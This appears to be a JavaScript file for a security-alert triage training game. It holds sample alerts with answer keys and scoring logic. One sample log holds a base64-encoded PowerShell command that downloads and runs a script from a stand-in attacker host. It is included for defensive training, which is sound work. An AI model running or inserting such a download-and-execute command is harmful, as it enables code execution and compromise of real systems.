// Sample Alert Dataset (Stages 2 & 3 groundwork)
const alerts = [
  {
    id: 'ALT-1001',
    title: 'Suspicious PowerShell Execution',
    severity: 'high',
    timestamp: '2026-09-03 10:42:11 UTC',
    sourceIp: '192.168.1.105',
    username: 'j.doe',
    correctAction: 'escalate',
    logs: {
      EventID: 4688,
      ProcessName: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      CommandLine: "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
      ParentProcess: "C:\\Windows\\explorer.exe"
    },
    explanation: "High Risk: The command contains an encoded payload (-enc) attempting to download an external script with ExecutionPolicy Bypass."
  },
  {
    id: 'ALT-1002',
    title: 'Multiple Failed SSH Attempts',
    severity: 'medium',
    timestamp: '2026-09-03 10:45:00 UTC',
    sourceIp: '198.51.100.24',
    username: 'root',
    correctAction: 'remediate',
    logs: {
      Service: "sshd",
      Status: "Failed password",
      Attempts: 45,
      TargetPort: 22,
      UserAgent: "OpenSSH_8.2p1"
    },
    explanation: "Medium Risk: Inbound brute force pattern detected targeting port 22. Standard remediation is blocking the external IP on the firewall."
  },
  {
    id: 'ALT-1003',
    title: 'Scheduled System Backup Completed',
    severity: 'low',
    timestamp: '2026-09-03 10:50:00 UTC',
    sourceIp: '10.0.0.12',
    username: 'svc_backup',
    correctAction: 'dismiss',
    logs: {
      TaskName: "\\Microsoft\\Windows\\Backup\\Nightly",
      Status: "SUCCESS",
      BytesTransferred: "142.5 GB"
    },
    explanation: "False Positive / Informational: Standard scheduled administrative task completed without errors."
  }
];

let selectedAlert = null;
let closedCount = 0;
let correctCount = 0;

function init() {
  renderAlertQueue();
}

function renderAlertQueue() {
  const listEl = document.getElementById('alert-list');
  listEl.innerHTML = '';

  alerts.forEach(alert => {
    const card = document.createElement('div');
    card.className = `alert-card ${alert.severity}`;
    card.onclick = () => selectAlert(alert, card);
    card.innerHTML = `
      <div class="alert-title">${alert.title}</div>
      <div class="alert-meta">${alert.id} | ${alert.timestamp}</div>
    `;
    listEl.appendChild(card);
  });
}

function selectAlert(alert, cardEl) {
  selectedAlert = alert;
  
  // Highlight card
  document.querySelectorAll('.alert-card').forEach(c => c.classList.remove('active'));
  cardEl.classList.add('active');

  // Render Details & Logs
  const detailEl = document.getElementById('alert-detail');
  detailEl.innerHTML = `
    <h3>${alert.title} (${alert.id})</h3>
    <p><strong>Timestamp:</strong> ${alert.timestamp}</p>
    <p><strong>Source IP:</strong> <code>${alert.sourceIp}</code></p>
    <p><strong>User:</strong> <code>${alert.username}</code></p>
    <h4>Raw JSON Logs</h4>
    <div class="log-box">${JSON.stringify(alert.logs, null, 2)}</div>
  `;

  // Clear previous feedback
  const feedbackEl = document.getElementById('feedback');
  feedbackEl.style.display = 'none';
}

function makeDecision(action) {
  if (!selectedAlert) {
    alert("Select an alert from the queue first!");
    return;
  }

  const feedbackEl = document.getElementById('feedback');
  feedbackEl.style.display = 'block';

  closedCount++;
  if (action === selectedAlert.correctAction) {
    correctCount++;
    feedbackEl.className = 'feedback-box correct';
    feedbackEl.innerHTML = `<strong>Correct Decision!</strong><br>${selectedAlert.explanation}`;
  } else {
    feedbackEl.className = 'feedback-box incorrect';
    feedbackEl.innerHTML = `<strong>Incorrect Decision.</strong><br>${selectedAlert.explanation}`;
  }

  // Update metrics
  document.getElementById('closed-count').innerText = closedCount;
  const accuracy = Math.round((correctCount / closedCount) * 100);
  document.getElementById('accuracy').innerText = `${accuracy}%`;
}

window.onload = init;
